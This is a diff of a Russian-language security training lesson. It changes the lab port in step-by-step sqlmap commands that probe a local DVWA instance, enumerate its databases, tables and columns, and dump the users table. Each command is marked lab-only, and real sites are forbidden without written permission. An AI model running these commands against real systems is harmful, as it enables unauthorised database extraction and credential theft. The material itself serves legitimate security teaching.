@@ -23,7 +23,7 @@
 **Что нельзя переносить на Slider AI без отдельного разрешения:** учебные payloads выполнять только в DVWA/WebGoat/PortSwigger; на Slider AI использовать безопасные маркеры и passive evidence.
 
 
-**Процессный артефакт:** `THREAT_MODEL.md` или `SECURITY_FINDING_TEMPLATE.md`: abuse case, evidence и expected control.
+**Процессный артефакт:** встроенный шаблон threat model или finding из пользовательской инструкции: abuse case, evidence и expected control.
 
 **Безопасная цель:** DVWA, WebGoat, bWAPP, PortSwigger Web Security Academy или локальная учебная VM. Запрещены реальные сайты без письменного разрешения.
 
@@ -193,7 +193,7 @@ Kali ARM64 VM используется как углубление, когда �
 **Шаг 1: Проверка на уязвимость**
 ```bash
 # lab-only: выполнять только в учебной лаборатории/cloud lab; не выполнять на Slider AI без отдельного written approval
-sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
+sqlmap -u "http://127.0.0.1:8081/vulnerabilities/sqli/?id=1&Submit=Submit" \
   --cookie "PHPSESSID=ВАША_СЕССИЯ; security=low" \
   --batch
 ```
@@ -203,7 +203,7 @@ sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
 **Шаг 2: Получение списка баз данных**
 ```bash
 # lab-only: выполнять только в учебной лаборатории/cloud lab; не выполнять на Slider AI без отдельного written approval
-sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
+sqlmap -u "http://127.0.0.1:8081/vulnerabilities/sqli/?id=1&Submit=Submit" \
   --cookie "PHPSESSID=ВАША_СЕССИЯ; security=low" \
   --dbs --batch
 ```
@@ -213,7 +213,7 @@ sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
 **Шаг 3: Получение таблиц в базе dvwa**
 ```bash
 # lab-only: выполнять только в учебной лаборатории/cloud lab; не выполнять на Slider AI без отдельного written approval
-sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
+sqlmap -u "http://127.0.0.1:8081/vulnerabilities/sqli/?id=1&Submit=Submit" \
   --cookie "PHPSESSID=ВАША_СЕССИЯ; security=low" \
   -D dvwa --tables --batch
 ```
@@ -223,7 +223,7 @@ sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
 **Шаг 4: Получение колонок таблицы users**
 ```bash
 # lab-only: выполнять только в учебной лаборатории/cloud lab; не выполнять на Slider AI без отдельного written approval
-sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
+sqlmap -u "http://127.0.0.1:8081/vulnerabilities/sqli/?id=1&Submit=Submit" \
   --cookie "PHPSESSID=ВАША_СЕССИЯ; security=low" \
   -D dvwa -T users --columns --batch
 ```
@@ -233,7 +233,7 @@ sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
 **Шаг 5: Скачивание данных из таблицы users**
 ```bash
 # lab-only: выполнять только в учебной лаборатории/cloud lab; не выполнять на Slider AI без отдельного written approval
-sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
+sqlmap -u "http://127.0.0.1:8081/vulnerabilities/sqli/?id=1&Submit=Submit" \
   --cookie "PHPSESSID=ВАША_СЕССИЯ; security=low" \
   -D dvwa -T users --dump --batch
 ```
@@ -246,7 +246,7 @@ sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
 
 ```bash
 # lab-only: выполнять только в учебной лаборатории/cloud lab; не выполнять на Slider AI без отдельного written approval
-sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
+sqlmap -u "http://127.0.0.1:8081/vulnerabilities/sqli/?id=1&Submit=Submit" \
   --cookie "PHPSESSID=ВАША_СЕССИЯ; security=low" \
   --dbs --batch --proxy="http://127.0.0.1:8080"
 ```
@@ -316,7 +316,7 @@ sqlmap --version
 
 # Если cookie содержат спецсимволы, используйте одинарные кавычки
 # lab-only: выполнять только в учебной лаборатории/cloud lab; не выполнять на Slider AI без отдельного written approval
-sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1" \
+sqlmap -u "http://127.0.0.1:8081/vulnerabilities/sqli/?id=1" \
   --cookie 'PHPSESSID=abc123; security=low' \
   --batch
 ```
@@ -341,7 +341,7 @@ sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli/?id=1" \
 2. **Работа с POST-запросами**: На странице SQL Injection (Blind) в DVWA используется POST-форма. Используйте SQLMap для взлома:
    ```bash
 # lab-only: выполнять только в учебной лаборатории/cloud lab; не выполнять на Slider AI без отдельного written approval
-   sqlmap -u "http://127.0.0.1:8080/vulnerabilities/sqli_blind/" \
+   sqlmap -u "http://127.0.0.1:8081/vulnerabilities/sqli_blind/" \
      --data "id=1&Submit=Submit" \
      --cookie "PHPSESSID=ВАША_СЕССИЯ; security=low" \
      --dbs --batch
